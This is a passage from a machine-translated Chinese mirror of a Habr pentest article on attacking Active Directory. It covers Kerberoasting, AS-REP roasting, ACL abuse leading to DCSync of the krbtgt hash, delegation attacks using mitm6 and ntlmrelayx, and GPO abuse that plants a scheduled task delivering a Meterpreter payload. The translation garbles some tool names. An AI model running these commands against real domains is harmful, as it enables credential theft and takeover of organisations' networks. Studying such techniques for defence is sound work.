href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Powersploit</a> <br><br><pre> <code class="bash hljs">Invoke-Kerberoast -Domain jet.lab -OutputFormat Hashcat | fl</code> </pre> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">GetUserSPNs.py</a> <br><br><pre> <code class="bash hljs">GetUserSPNs.py -request jet.lab\user:Password</code> </pre> </li></ul><br><h3> 阿斯普鲁司特 </h3><br> 该漏洞是禁用了Kerberos预身份验证。 在这种情况下，我们可以向禁用了Kerberos预身份验证的用户发送AS-REQ请求，并使用密码获取加密的部分。 <br><br><img src="https://habrastorage.org/webt/zd/pm/h5/zdpmh5i7cas-s0gtv2uopy2sj14.png"><br><br> 该漏洞很少见，因为禁用预身份验证不是默认设置。 <br><br> 搜索禁用了Kerberos身份验证的用户： <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">威视</a> <br><br><pre> <code class="bash hljs">Get-DomainUser -PreauthNotRequired -Properties samaccountname -Verbose</code> </pre> </li><li> 活动目录模块 <br><br><pre> <code class="bash hljs">get-aduser -filter * -properties DoesNotRequirePreAuth | <span class="hljs-built_in"><span class="hljs-built_in">where</span></span> {<span class="hljs-variable"><span class="hljs-variable">$_</span></span>.DoesNotRequirePreAuth -eq <span class="hljs-string"><span class="hljs-string">"True"</span></span> -and <span class="hljs-variable"><span class="hljs-variable">$_</span></span>.Enabled -eq <span class="hljs-string"><span class="hljs-string">"True"</span></span>} | select Name</code> </pre> </li></ul><br> 获取加密部分： <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ASREP烤</a> <br><br><pre> <code class="bash hljs">Invoke-ASREPROast | fl</code> </pre> <br><img src="https://habrastorage.org/webt/i_/o-/vf/i_o-vfbviphgjknolenx_qoesyo.png"></li></ul><br><br><h1> 通过ACL攻击 </h1><br> 域上下文中的ACL是一组规则，用于定义AD中对象的访问权限。 可以为单个对象（例如，用户帐户）或组织单位（例如，OU）配置ACL。 在OU上配置ACL时，OU中的所有对象都将继承ACL。  ACL包含确定SID如何与Active Directory对象交互的访问控制项（ACE）。 <br><br> 例如，我们有三个组：A，B，C，其中组C是组B的成员，组B是组A的成员。将访客添加到组C时，访客不仅将是组C的成员，而且还将是组C的成员。 B组和A组的间接成员。将对域对象的访问权限添加到A组时，来宾用户也将有权访问此对象。 在用户仅是一个组的直接成员而该组是其他50个组的间接成员的情况下，很容易失去继承权限的连接。 <br><br> 您可以通过运行以下命令来检索与对象关联的ACL。 <br><br><pre> <code class="bash hljs">Get-ObjectACL -Samaccountname Guest -ResolveGUIDs</code> </pre> <br> 您可以使用该工具来利用ACL配置中的错误。 <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">调用ACLPwn</a> 。  Powershell脚本使用BloodHound收集器SharpHound收集有关域中所有ACL的信息，并构建一条链以获得writeDACL权限。 构建链后，脚本将操作链的每个步骤。 脚本的顺序： <br><br><ol><li> 用户被添加到必要的组。 </li><li> 将两个ACE（复制目录更改和复制目录更改全部）添加到域对象的ACL中。 </li><li> 如果您具有使用Mimikatz实用程序进行DCSync的权限，则请求用户krbtgt的密码哈希（默认设置）。 </li><li> 操作完成后，脚本将删除ACL中所有已添加的组和ACE条目。 </li></ol><br> 该脚本仅针对使用writeDACL权限。 攻击者可能还对以下访问权限感兴趣： <br><br><ul><li>  ForceChangePassword。 未知当前密码时有权更改用户密码。 使用PowerSploit进行操作-Set-DomainUserPassword。 </li><li>  AddMembers。 将组，计算机和用户添加到组的权限。 使用PowerSploit进行操作-Add-DomainGroupMember。 </li><li> 通用写入 更改对象属性的权限。 例如，更改scriptPath参数的值。 用户下次登录系统时，指定的文件将启动。 使用PowerSploit进行操作-Set-DomainObject。 </li><li>  WriteOwner。 更改对象所有者的权利。 使用PowerSploit进行操作-Set-DomainObjectOwner。 </li><li>  AllExtendedRights。 有权将用户添加到组，更改用户密码等。使用PowerSploit进行操作-Set-DomainUserPassword或Add-DomainGroupMember。 </li></ul><br> 操作方式： <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">调用提示</a> </li></ul><br> 从域中的机器开始 <br><br><pre> <code class="bash hljs">./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe</code> </pre> <br> 从不在域中的机器开始 <br><br><pre> <code class="bash hljs">/Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username <span class="hljs-string"><span class="hljs-string">'domain\user'</span></span> -Domain <span class="hljs-string"><span class="hljs-string">'fqdn_of_target_domain'</span></span> -Password <span class="hljs-string"><span class="hljs-string">'Pass'</span></span></code> </pre> <br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">aclpwn.py</a>是用Python编写的类似工具 </li></ul><br><h3>  Kerberos委派 </h3><br>  Kerberos授权授权使您可以重用最终用户凭据来访问另一台服务器上托管的资源。 <br><br>  Kerberos委托可以是三种类型： <br><br><ol><li> 无限（无限制委派）。  Windows Server 2003之前的唯一委派选项 </li><li> 自Windows Server 2003以来受约束的委派 </li><li> 基于资源的约束委派  Windows Server 2012中引入 </li></ol><br><h4> 无限委托 </h4><br> 在Active Directory管理单元中，启用的无限制委派功能如下： <br><br><img src="https://habrastorage.org/webt/ip/mp/e8/ipmpe8ygslgtbdklbkiseqtwg64.png"><br><br> 为了清楚起见，请考虑如何在图上进行无限委派。 <br><br><img src="https://habrastorage.org/webt/1i/p1/wq/1ip1wqkjnc9plqcqzmpkr1rcfwg.png"><br><br><ol><li> 用户密码将转换为ntlm哈希。 时间戳使用此哈希进行加密，然后发送到域控制器以请求TGT票证。 </li><li> 域控制器检查有关用户的信息（登录限制，组成员身份等），创建TGT票证并将其发送给用户。  TGT票证已加密，签名，并且只有krbtgt可以读取其数据。 </li><li> 用户请求TGS票证来访问Web服务器上的Web服务。 </li><li> 域控制器提供了TGS票证。 </li><li> 用户将TGT和TGS票证发送到Web服务器。 </li><li>  Web服务器服务帐户使用用户的TGT票证来请求TGS票证来访问数据库服务器。 </li><li> 该服务帐户以用户身份连接到数据库服务器。 </li></ol><br> 无限委派的主要危险是，当一台具有无限委派的计算机受到威胁时，攻击者将能够从该计算机获取用户的TGT票证，并代表这些用户访问域中的任何系统。 <br><br> 在无限制委派的域中搜索机器： <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">威视</a> <br><br><pre> <code class="bash hljs">Get-NetComputer -unconstrained</code> </pre> </li><li> 活动目录模块 <br><br><pre> <code class="bash hljs">Get-Adcomputer -Filter {TrustedForDelegation -eq <span class="hljs-variable"><span class="hljs-variable">$True</span></span>}</code> </pre>  。 </li></ul><br> 门票出口： <br><br><ul><li> 使用mimikatz。  sekurlsa ::门票/出口 </li><li> 您还可以执行“通票”攻击。 <br><br><pre> <code class="bash hljs"> kerberos::ptt C:\tickets\.</code> </pre> </li></ul><br><img src="https://habrastorage.org/webt/oa/wa/25/oawa25sduaj5u303b1q9svirdku.gif"><br><br><h4> 代表团有限 </h4><br> 受限委派模式允许您仅在特定计算机上访问允许的服务。 在Active Directory管理单元中，如下所示： <br><br><img src="https://habrastorage.org/webt/xj/ku/no/xjkunogyspfpevoanui8nzxwlzq.png"><br><br> 在有限的委派下，使用了2个Kerberos协议扩展： <br><br><ul><li> 自我 </li><li>  S4U代理 </li></ul><br> 当客户端未使用Kerberos协议进行身份验证时，将使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">S4U2Self</a> 。 <br><br> 对于无限制委派，TGT用于标识用户，在这种情况下，S4U扩展使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">PA-FOR-USER</a>结构作为padata / pre-authentication数据字段中的新类型。 仅当发出请求的用户的userAccountControl中设置了TRUSTED_TO_AUTH_FOR_DELEGATION字段时，才允许S4U2self进程。 <br><br><img src="https://habrastorage.org/webt/oo/yk/5s/ooyk5sjtsusxcfkois5ej7dgnua.png"><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">S4U2Proxy</a>允许服务帐户使用在S4U2proxy进程中接收的重定向票证来请求TGS票证以访问允许的服务（msds-allowtodelegateto）。  KDC检查在请求用户的msds-allowtodelegateto字段中是否指定了所请求的服务，如果检查成功，则发出票证。 因此，委派“限于”特定的目标服务。 <br><br><img src="https://habrastorage.org/webt/t-/a7/n6/t-a7n6ludbpsvmbk0ru_kwxvpq4.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可以使用</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerView</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在受限的委派域中搜索计算机和用户</font><font style="vertical-align: inherit;">。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索无限制委派的计算机</font></font><br><br><pre> <code class="bash hljs">Get-DomainComputer -TrustedtoAuth</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 搜索有限的委派用户 </font></font><br><br><pre> <code class="bash hljs">Get-DomainUser -TrustedtoAuth</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 要进行攻击，我们需要一个开放密码，一个NTLM密码哈希或TGT票证。 </font></font><br><br><img src="https://habrastorage.org/webt/gd/5f/fx/gd5ffxfwmgeqr5j28ovwzcqqacy.gif"><br><br><h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 基于资源的有限委派 </font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与常规委派一样，使用S4U扩展。由于基于资源的委派主要是受限委派，因此在此处也可以使用与常规受限委派有关的攻击。唯一的区别是，在简单的受限委派中，服务A应该具有</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msDS-AllowedToDelegateTo</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> = ServiceB属性，这里服务B应该具有</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msDS-AllowedToActOnBehalfOfOtherIdentity</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> = Service A </font><font style="vertical-align: inherit;">属性</font></font><br><br><img src="https://habrastorage.org/webt/td/um/jl/tdumjlcportki98xbixgfo1jaiu.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该属性允许</font><font style="vertical-align: inherit;">由</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">harmj0y</font></a><font style="vertical-align: inherit;">发布的</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">另</font></a><font style="vertical-align: inherit;">一种</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击</font></font></a><font style="vertical-align: inherit;"></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">攻击需要获得权限以修改PrincipalsAllowedToDelegateToAccount参数，该参数设置msds-AllowedToActOnBehalfOfOtherIdentity属性，该属性包含访问控制列表（ACL）。</font><font style="vertical-align: inherit;">与有限的委派不同，我们不需要域管理员权限来更改msds-AllowedToActOnBehalfOfOtherIdentity属性。</font><font style="vertical-align: inherit;">您可以找出谁有权编辑该属性，如下所示：</font></font><br><br><pre> <code class="plaintext hljs">(Get-acl "AD:$((get-adcomputer Windows7).distinguishedname)").access | Where-Object -Property ActiveDirectoryRights -Match WriteProperty |out-gridview</code> </pre> <br><img src="https://habrastorage.org/webt/ej/4p/bk/ej4pbkl5bkv5y75mqp54mxu0qcm.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 因此，要执行攻击，请执行mitm6 </font></font><br><br><pre> <code class="bash hljs">mitm6 -I vmnet0</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 我们以--delegate-access选项启动ntlmrelayx </font></font><br><br><pre> <code class="plaintext hljs">ntlmrelayx -t ldaps://dc1.jet.lab --delegate-access</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 攻击的结果是，创建了ZGXTPVYX $计算机，该计算机具有对Windows7计算机的委派权限。 </font></font><br><br><pre> <code class="plaintext hljs">$x = Get-ADComputer Windows7 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity $x.'msDS-AllowedToActOnBehalfOfOtherIdentity'.Access</code> </pre><br><img src="https://habrastorage.org/webt/21/oo/w9/21oow9kxnu53sg9wi-xnneus9fc.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Yegor Podmokov在PHDays上</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发表</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了</font><font style="vertical-align: inherit;">一份不错的代表团报告</font><font style="vertical-align: inherit;">。</font></font><br><br><img src="https://habrastorage.org/webt/kr/ri/za/krrizaffbrqgiee3gd2kufqs8s4.gif"><br><br><h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 滥用GPO权限 </font></font></h4><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">组策略对象</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是允许管理员有效管理域的工具。</font><font style="vertical-align: inherit;">但是碰巧的是，为用户分配了不必要的权限，包括更改GPO策略。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了演示该示例，我们将为Ragnar用户添加编辑默认域控制器策略的权限（实际上，该策略的权限仅授予域管理员，但攻击的本质不会改变;对于其他策略，只有受控主机会更改）。</font></font><br><br><img src="https://habrastorage.org/webt/yw/on/ht/ywonhtpbkwdqffjvzck5hdhjgza.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><a href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerView</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举域中所有GPO的权限</font><font style="vertical-align: inherit;">。</font></font><br><br><pre> <code class="plaintext hljs">Get-NetGPO | % {Get-ObjectAcl -ResolveGUIDs -Name $_.Name}</code> </pre> <br><img src="https://habrastorage.org/webt/fk/cf/sk/fkcfskfmeohuicn13_76t190miy.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ragnar用户有权更改GUID为6AC1786C-016F-11D2-945F-00C04FB984F9的GPO。</font><font style="vertical-align: inherit;">要确定域中的哪些主机应用此策略，请运行以下命令</font></font><br><br><pre> <code class="plaintext hljs">Get-NetOU -GUID "6AC1786C-016F-11D2-945F-00C04FB984F9" | % {Get-NetComputer -AdSpath $_}</code> </pre> <br><img src="https://habrastorage.org/webt/ou/ut/9c/ouut9cizgebvp9q_dkoifqlqgic.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获得主机dc1.jet.lab。</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">知道Ragnar用户可以编辑的特定策略以及该策略适用的主机，我们可以在dc1.jet.lab主机上执行各种操作。</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下是使用GPO的选项</font></font></b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 计算机配置\首选项\控制面板设置\文件夹选项 </font></font></td><td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 创建/更改文件类型关联，向这些关联注册DDE操作 </font></font></td></tr><tr><td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 计算机配置\首选项\控制面板设置\本地用户和组 </font></font></td><td> Add new local admin account </td></tr><tr><td> Computer Configuration\Preferences\Control Panel Settings\Scheduled Tasks </td><td> Deploy a new evil scheduled task (ie: PowerShell download cradle) </td></tr><tr><td> Computer Configuration\Preferences\Control Panel Settings\Services </td><td> Create and configure new evil services </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Files </td><td> Affected computers will download a file from the domain controller </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\INI Files </td><td> Update existing INI files </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Registry </td><td> Update specific registry keys. Very useful for disabling security mechanisms, or triggering code execution in any number of ways </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Shortcuts </td><td> Deploy a new evil shortcut </td></tr><tr><td> Computer Configuration\Policies\Software Settings\Software installation </td><td> Deploy an evil MSI. The MSI must be available to the GP client via a network share </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Scripts (startup/shutdown) </td><td> Configure and deploy evil startup scripts. Can run scripts out of GPO directory, can also run PowerShell commands with arguments </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Audit Policy </td><td> Modify local audit settings. Useful for evading detection </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\User Rights Assignment\ </td><td> Grant a user the right to logon via RDP, grant a user SeDebugPrivilege, grant a user the right to load device drivers, grant a user seTakeOwnershipPrivilege. Basically, take over the remote computer without ever being an administrator on it </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Registry </td><td> Alter DACLs on registry keys, grant yourself an extremely hard to find backdoor on the system </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Windows Firewall </td><td> Manage the Windows firewall. Open up ports if they're blocked </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Environment </td><td> Add UNC path for DLL side loading </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Files </td><td> Copy a file from a remote UNC path </td></tr></tbody></table></div><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过</font></font><a href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">New-GPOImmediateTask</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SharpGPOAbuse工具，</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可以：</font></font><br><br><ul><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 在任务计划程序中运行任务 </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 添加用户权限（SeDebugPrivilege，SeTakeOwnershipPrivilege等） </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 添加启动后运行的脚本 </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 将用户添加到本地组 </font></font></li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 例如，在任务计划程序中添加任务以获取Meterpreter会话： </font></font><br><br><pre> <code class="plaintext hljs">New-GPOImmediateTask -TaskName test3 -GPODisplayName "Default Domain Controllers Policy" -CommandArguments '&lt;powershell_meterepreter_payload&gt;' -Force</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行后，计划任务显示为test，</font></font><br><br><img src="https://habrastorage.org/webt/dr/au/v8/drauv8km1pwp56jt_reymw8d5gw.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并且</font><font style="vertical-align: inherit;">出现</font><font style="vertical-align: inherit;">Meterpreter会话</font></font><br><br><img src="https://habrastorage.org/webt/js/e6/g8/jse6g8vqatvnvr5h1qlx2mvrvzq.png"><br><br><img src="https://habrastorage.org/webt/zj/ct/wz/zjctwz7ca8xg5j6zbqoqlf3q9w0.gif"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要删除计划任务，需要运行以下命令：</font></font><br><br><pre> <code class="plaintext hljs">New-GPOImmediateTask -Remove -Force -GPODisplayName SecurePolicy</code> </pre> <br><h1> 结论 </h1><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本文中，我们仅研究了一些攻击媒介。</font><font style="vertical-align: inherit;">对Exchange的攻击（如</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">Ruler</font></a><font style="vertical-align: inherit;">，</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">PrivExchange</font></a><font style="vertical-align: inherit;">，</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;">ExchangeRelayX</font></a><font style="vertical-align: inherit;">）之类的</font><font style="vertical-align: inherit;">视图，例如</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举帐户和密码spray</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MS14-068</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，大量</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印机错误</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和不受约束的委托等，</font><font style="vertical-align: inherit;">可以极大地扩大攻击范围。</font><font style="vertical-align: inherit;">攻击技术和固定方法（金票，银票，哈希传递，越过哈希，SID历史记录，DC阴影等）一直在变化，并且防御团队应始终为新型攻击做好准备。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"></font><br><br><font style="vertical-align: inherit;"></font></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN449278/">https://habr.com/ru/post/zh-CN449278/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN449264/index.html">为1C创建报告系统：基于OLAP和Excel的ERP</a></li>
<li><a href="../zh-CN449266/index.html">RusCrypto的3个报告：具有经验的会议</a></li>
<li><a href="../zh-CN449270/index.html">Yandex发布了IT空缺市场概述</a></li>
<li><a href="../zh-CN449274/index.html">ESP8266的7段大型显示屏带有霓虹灯</a></li>
<li><a href="../zh-CN449276/index.html">35岁的职业变化。我的经历和最初的成功</a></li>
<li><a href="../zh-CN449280/index.html">针对b2b和b2c客户的云游戏平台如何工作。 拍摄精美照片并与最后一英里搏斗的解决方案</a></li>
<li><a href="../zh-CN449282/index.html">备份，第1部分：目的，技术概述</a></li>
<li><a href="../zh-CN449284/index.html">我在网上卖洋葱</a></li>
<li><a href="../zh-CN449286/index.html">进行GraphQL API</a></li>
<li><a href="../zh-CN449288/index.html">建立真正的线上商店需要什么团队？</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>